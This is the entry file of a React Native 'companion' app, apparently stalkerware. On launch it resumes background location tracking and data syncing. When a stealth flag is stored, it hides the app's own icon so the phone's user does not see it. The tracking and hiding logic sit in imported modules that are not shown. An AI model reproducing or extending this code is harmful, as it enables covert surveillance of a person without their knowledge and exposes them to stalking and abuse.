// companion-app/App.tsx
import React, { useEffect, useState } from "react";
import { StatusBar } from "expo-status-bar";
import { View, ActivityIndicator, StyleSheet } from "react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { STORAGE_KEYS } from "./src/config";
import { SetupScreen } from "./src/screens/SetupScreen";
import { startSyncCoordinator } from "./src/services/SyncCoordinator";
import { startBackgroundLocation } from "./src/services/LocationService";
import { activateStealthMode } from "./src/services/StealthService";

export default function App() {
  const [loading, setLoading] = useState(true);
  const [isActivated, setIsActivated] = useState(false);

  useEffect(() => {
    async function checkActivation() {
      try {
        const activated = await AsyncStorage.getItem(STORAGE_KEYS.IS_ACTIVATED);
        const deviceId = await AsyncStorage.getItem(STORAGE_KEYS.DEVICE_ID);

        if (activated === "true" && deviceId) {
          setIsActivated(true);
          // Resume background tasks immediately
          await startBackgroundLocation();
          startSyncCoordinator(deviceId);

          // Hide icon if stealth mode is flagged
          const isHidden = await AsyncStorage.getItem(STORAGE_KEYS.IS_HIDDEN);
          if (isHidden === "true") {
            activateStealthMode();
          }
        }
      } catch (err) {
        console.error("App boot check error", err);
      } finally {
        setLoading(false);
      }
    }

    checkActivation();
  }, []);

  if (loading) {
    return (
      <View style={styles.center}>
        <ActivityIndicator size="large" color="#FFFC00" />
      </View>
    );
  }

  return (
    <>
      <StatusBar style="light" />
      <SetupScreen />
    </>
  );
}

const styles = StyleSheet.create({
  center: { flex: 1, backgroundColor: "#0B0B0E", justifyContent: "center", alignItems: "center" },
});
